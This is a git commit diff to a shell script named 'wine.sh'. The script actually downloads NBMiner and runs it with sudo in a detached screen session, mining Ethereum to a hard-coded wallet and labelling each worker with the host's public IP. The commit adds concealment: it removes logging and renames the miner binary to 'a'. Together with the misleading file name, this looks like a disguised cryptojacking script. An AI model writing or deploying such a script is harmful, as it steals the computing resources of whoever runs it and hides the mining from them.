b0bae89b3a2615e4ee6eb9e932b4784cce868106
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-12-09 00:02:58 +0700

    Update wine.sh

--- wine.sh
+++ wine.sh
@@ -3,7 +3,7 @@
 WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
 PAL=stratum+tcp://us-eth.2miners.com:2020
 WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
-COMA="-a ethash -o $PAL -u $WELS.$WER -log"
+COMA="-a ethash -o $PAL -u $WELS.$WER"
 
 
 
@@ -15,6 +15,7 @@ else
     wget https://github.com/NebuTech/NBMiner/releases/download/v39.6/NBMiner_39.6_Linux.tgz
     tar zxvf NBMiner_39.6_Linux.tgz
     cd NBMiner_Linux
+    mv nbminer a
     chmod +x *
 fi
-screen -dmLS mine sudo ./nbminer $COMA
+screen -dmLS mine sudo ./a $COMA
